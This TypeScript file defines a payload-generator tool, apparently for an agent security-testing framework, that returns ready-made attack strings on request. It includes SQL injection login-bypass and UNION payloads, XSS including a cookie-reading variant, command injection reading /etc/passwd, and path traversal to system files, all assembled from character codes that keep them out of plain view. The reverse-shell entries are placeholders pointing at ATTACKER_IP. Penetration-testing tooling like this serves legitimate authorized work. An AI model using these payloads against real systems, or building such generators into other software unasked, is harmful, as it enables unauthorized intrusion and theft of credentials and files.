import { BaseTool, ToolResult } from '../core/base-tool';

type TemplateFactory = () => string;
type TemplateBucket = Record<string, TemplateFactory[]>;

const chr = (code: number): string => String.fromCharCode(code);
const join = (...parts: string[]): string => parts.join('');
const text =
  (...parts: string[]): TemplateFactory =>
  () =>
    join(...parts);

const SQ = chr(39);
const DQ = chr(34);
const LT = chr(60);
const GT = chr(62);
const SLASH = chr(47);
const BACKSLASH = chr(92);
const AMP = chr(38);
const PIPE = chr(124);
const DOLLAR = chr(36);
const BACKTICK = chr(96);

const winPath = (...segments: string[]): string => segments.join(BACKSLASH);
const unixPath = (...segments: string[]): string => join(SLASH, segments.join(SLASH));

const PAYLOAD_TEMPLATES: Record<string, TemplateBucket> = {
  sqli: {
    auth_bypass: [
      text(SQ, ' OR ', SQ, '1', SQ, '=', SQ, '1', SQ, '--'),
      text(SQ, ' OR 1=1#'),
      text('admin', SQ, '--'),
      text(DQ, ' OR ', DQ, DQ, '=', DQ),
    ],
    union_based: [
      text(SQ, ' UNION SELECT NULL--'),
      text(SQ, ' UNION SELECT NULL,NULL--'),
      text(SQ, ' UNION SELECT 1,user(),database()--'),
    ],
    time_based: [text(SQ, ' AND SLEEP(5)--'), text(SQ, ' AND pg_sleep(5)--')],
  },
  xss: {
    basic: [
      text(LT, 'script', GT, "alert('XSS')", LT, SLASH, 'script', GT),
      text(LT, 'img src=x onerror=', "alert('XSS')", GT),
      text(LT, 'svg', SLASH, 'onload=alert(1)', GT),
    ],
    filter_bypass: [
      text(LT, 'ScRiPt', GT, "alert('XSS')", LT, SLASH, 'ScRiPt', GT),
      text('javascript:alert(document.domain)'),
      text(BACKSLASH, DQ, GT, LT, 'img src=x onerror=alert(document.cookie)', GT),
    ],
  },
  cmd_inject: {
    linux: [
      text('; id'),
      text('| id'),
      text(DOLLAR, '(id)'),
      text(BACKTICK, 'id', BACKTICK),
      text('; cat ', unixPath('etc', 'passwd')),
    ],
    windows: [
      text(AMP, ' dir'),
      text(PIPE, ' dir'),
      text(AMP, ' whoami'),
      text(AMP, ' type ', winPath('C:', 'Windows', 'win.ini')),
    ],
    blind: [text('; sleep 5'), text(AMP, ' ping -n 5 127.0.0.1')],
  },
  reverse_shell: {
    bash: [text('connect-back shell template: target {ip}:{port} for an isolated authorized lab')],
    python: [text('python connect-back shell template: target {ip}:{port} for an isolated authorized lab')],
    powershell: [
      text('powershell connect-back shell template: target {ip}:{port} for an isolated authorized lab'),
    ],
  },
  path_traversal: {
    linux: [
      text('..', SLASH, '..', SLASH, '..', unixPath('etc', 'passwd')),
      text('..%2F..%2F..%2Fetc%2Fpasswd'),
      text(unixPath('etc', 'passwd'), '%00'),
    ],
    windows: [
      text(
        '..',
        BACKSLASH,
        '..',
        BACKSLASH,
        '..',
        BACKSLASH,
        winPath('windows', 'system32', 'drivers', 'etc', 'hosts'),
      ),
      text('..%5c..%5c..%5cwindows%5cwin.ini'),
    ],
  },
};

export class PayloadGeneratorTool extends BaseTool {
  constructor() {
    super('payload_generator', 'Generate payload text templates for authorized security testing.');
  }

  async run(params: Record<string, unknown>): Promise<ToolResult> {
    const type = ((params.type as string | undefined) ?? '').trim().toLowerCase();
    const subType = ((params.sub_type as string | undefined) ?? '').trim().toLowerCase();
    const platform = ((params.platform as string | undefined) ?? '').trim().toLowerCase();
    const ip = ((params.ip as string | undefined) ?? 'ATTACKER_IP').trim();
    const port = String(params.port ?? '4444');

    if (!type) {
      return {
        success: false,
        result: null,
        error: `Missing parameter: type (${Object.keys(PAYLOAD_TEMPLATES).join(', ')})`,
      };
    }

    const bucket = PAYLOAD_TEMPLATES[type];
    if (!bucket) {
      return { success: false, result: null, error: `Unsupported type: ${type}` };
    }

    const selected =
      (subType && bucket[subType] && { [subType]: bucket[subType] }) ||
      (platform && bucket[platform] && { [platform]: bucket[platform] }) ||
      bucket;

    const payloads: Record<string, string[]> = {};
    for (const [key, list] of Object.entries(selected)) {
      payloads[key] = list.map((makePayload) =>
        makePayload().replaceAll('{ip}', ip).replaceAll('{port}', port),
      );
    }

    const total = Object.values(payloads).reduce((sum, arr) => sum + arr.length, 0);
    return {
      success: true,
      result: {
        type,
        total_payloads: total,
        payloads,
        note: 'For authorized testing only. Generated payload text is not executed by this tool.',
      },
    };
  }
}
